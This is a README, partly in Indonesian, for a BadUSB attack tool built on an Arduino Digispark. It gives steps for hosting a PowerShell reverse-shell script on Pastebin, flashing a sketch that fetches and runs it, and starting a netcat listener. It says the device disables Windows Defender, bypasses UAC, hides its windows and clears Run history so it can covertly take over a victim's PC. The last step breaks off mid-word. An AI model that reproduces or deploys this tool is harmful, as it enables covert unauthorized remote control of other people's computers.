# Make BAD USB to Reverse Shell with Arduino Digispark **(recommended with attiny85)**

## Cara Pakai
**Pastikan Anda telah menginstal Driver Digispark dan mengonfigurasi Arduino IDE Anda sebelum mencoba script ini.**
1. Ganti IP & Port sesuai dengan target netcat kamu di 'reversescript.PS1'
2. Upload reversescript.PS1 ke Pastebin/Paste eviltwin , raw dan salin link tersebut. 
3. Ganti 'REMOTESCRIPTURL' dengan link raw paste yang kamu salin tadi di line 37 didalam 'yamano.ino'
4. Buka dan upload 'yamano.ino' via Arduino IDE untuk digispark milikmu.
5. Buatlah netcat target . `nc -v -n -l -p PORT`
6. Apabila sudah jalankan script ter

## What it Does
- Disables Windows Defender to allow the Reverse Shell connection between the victim and server.
- Establishes Reverse Shell connection using Powershell script hosted online.
- Bypasses UAC prompts
- Remains completely hidden from taskbar, and opens no visible windows.
- Clears Run box history from registry.
